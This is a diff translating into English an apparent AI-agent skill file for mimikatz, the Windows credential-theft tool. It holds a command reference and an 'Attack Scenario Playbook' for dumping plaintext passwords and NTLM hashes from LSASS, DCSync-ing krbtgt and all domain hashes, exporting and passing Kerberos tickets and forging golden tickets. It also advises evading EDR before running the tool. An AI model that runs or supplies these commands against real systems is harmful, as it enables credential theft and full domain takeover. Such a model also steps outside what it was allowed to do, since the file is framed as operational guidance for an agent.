@@ -2,48 +2,52 @@
 name: mimikatz-credentials
 description: "mimikatz: Post-local privilege escalation session credential harvesting and DCSync domain-wide hashes. Signals: memory dump, lsass, enable debug privilege, memory plaintext/NTLM capture."
 zh-signals: "mimikatz: 单机提权后收割会话凭证、DCSync 全域哈希。信号:内存转储,lsass,提升调试权限,内存抓明文/NTLM。"
+when-to-use: >-
+  Use after local admin or SYSTEM access on Windows to harvest plaintext
+  passwords, hashes, and tickets from LSASS, or to DCSync domain hashes with
+  directory replication rights.
 ---
 
 # mimikatz
 
-- 攻击大类:C24 内存转储与LSASS窃取
-- 上游仓库:https://github.com/gentilkiwi/mimikatz
-- 上游 License:CC BY 4.0(署名)(本 SKILL.md 以 Apache-2.0 二次开源,上游版权归原项目所有)
+- Attack Category: C24 Memory Dumping and LSASS Theft
+- Upstream Repository: https://github.com/gentilkiwi/mimikatz
+- Upstream License: CC BY 4.0 (attribution) (this SKILL.md is re-released under Apache-2.0; upstream copyright belongs to the original project)
 
-## 安装
+## Installation
 
 ```bash
-release 下载 mimikatz.exe 或 chocolatey install mimikatz
+Download mimikatz.exe from the release page, or chocolatey install mimikatz
 ```
 
-## 参数速查
+## Parameter Quick Reference
 
-| 参数 / 命令 | 说明 |
+| Parameter / Command | Description |
 | --- | --- |
-| `privilege::debug` | 提升调试权限 |
-| `sekurlsa::logonpasswords` | 内存抓明文/NTLM |
-| `lsadump::sam` | 本地 SAM 数据库 |
-| `lsadump::dcsync /user:corp\krbtgt` | DCSync 拉 krbtgt |
-| `sekurlsa::tickets /export` | 导出票据 |
-| `kerberos::ptt ticket.kirbi` | 见上游文档 |
-| `kerberos::golden /user:Administrator /domain:corp.local /sid:S-1-5-21-x /krbtgt:<hash>` | 见上游文档 |
+| `privilege::debug` | Enable debug privilege |
+| `sekurlsa::logonpasswords` | Extract plaintext/NTLM from memory |
+| `lsadump::sam` | Local SAM database |
+| `lsadump::dcsync /user:corp\krbtgt` | DCSync pull of krbtgt |
+| `sekurlsa::tickets /export` | Export tickets |
+| `kerberos::ptt ticket.kirbi` | See the upstream documentation |
+| `kerberos::golden /user:Administrator /domain:corp.local /sid:S-1-5-21-x /krbtgt:<hash>` | See the upstream documentation |
 
-## 攻击场景 Playbook
+## Attack Scenario Playbook
 
-### 单机提权后收割会话凭证
+### Harvest session credentials after local privilege escalation
 
 ```bash
 mimikatz # privilege::debug
 mimikatz # sekurlsa::logonpasswords
-# 复制 NTLM 哈希用于 pth 或 cracking
+# Copy the NTLM hashes for pth or cracking
 ```
 
-### DCSync 全域哈希
+### DCSync domain-wide hashes
 
 ```bash
 mimikatz # lsadump::dcsync /domain:corp.local /all /csv
 ```
 
-## 注意事项
+## Notes
 
-Windows 端必备;LSA Protection/ Credential Guard 环境改用 sekurlsa::dpapi 或转储 DPAPI masterkey。任何 EDR 环境都会拦截,需先落地规避。
+A must-have on Windows; in environments with LSA Protection/Credential Guard, switch to sekurlsa::dpapi or dump the DPAPI masterkey instead. Any EDR environment will flag it, so drop and evade first.
